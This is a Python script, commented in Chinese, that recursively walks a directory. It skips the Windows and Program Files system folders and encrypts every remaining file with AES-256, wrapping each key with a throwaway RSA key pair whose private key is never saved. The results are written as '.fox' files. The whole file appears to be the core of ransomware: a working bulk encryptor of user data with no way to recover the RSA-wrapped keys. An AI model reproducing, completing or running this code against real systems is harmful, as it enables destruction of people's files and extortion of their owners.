import os
import base64
import sys 
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding, hashes, serialization
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import rsa, padding as rsa_padding
from getpass import getpass

# 生成随机盐值和IV
def generate_salt_iv():
    return os.urandom(16), os.urandom(16)

# 使用PBKDF2HMAC从密码生成密钥
def generate_key_from_password(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,  # 生成256位（32字节）的密钥
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    return kdf.derive(password.encode())

# 使用AES-256对数据进行加密
def aes_256_encrypt(data, key, iv):
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    return encrypted_data

# 主函数
def main(root_directory):
    # 获取用户密码
    password = getpass("Enter password for encryption: ")

    # 生成RSA密钥对
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=2048,
    )
    public_key = private_key.public_key()

    # 遍历文件夹
    for root, dirs, files in os.walk(root_directory):
        dirs[:] = [d for d in dirs if d not in ['Windows', 'Program Files', 'ProgramData']]  # 排除关键文件夹
        for file in files:
            file_path = os.path.join(root, file)
            try:
                # 生成随机盐值和IV
                salt, iv = generate_salt_iv()

                # 从密码生成AES密钥
                aes_key = generate_key_from_password(password, salt)

                # 读取文件内容
                with open(file_path, 'rb') as file:
                    data = file.read()

                # 使用AES加密数据
                encrypted_data = aes_256_encrypt(data, aes_key, iv)

                # 使用RSA加密AES密钥
                encrypted_aes_key = public_key.encrypt(
                    aes_key,
                    rsa_padding.OAEP(
                        mgf=rsa_padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )

                # 构建加密文件的路径
                encrypted_file_path = file_path + '.fox'
                with open(encrypted_file_path, 'wb') as fox_file:
                    # 写入盐值
                    fox_file.write(salt)
                    # 写入IV
                    fox_file.write(iv)
                    # 写入加密的AES密钥
                    fox_file.write(encrypted_aes_key)
                    # 写入加密后的数据
                    fox_file.write(encrypted_data)

                print(f"Encrypted {file_path}")

            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python encryption_script.py <root_directory>")
        sys.exit(1)

    root_directory = sys.argv[1]
    main(root_directory)
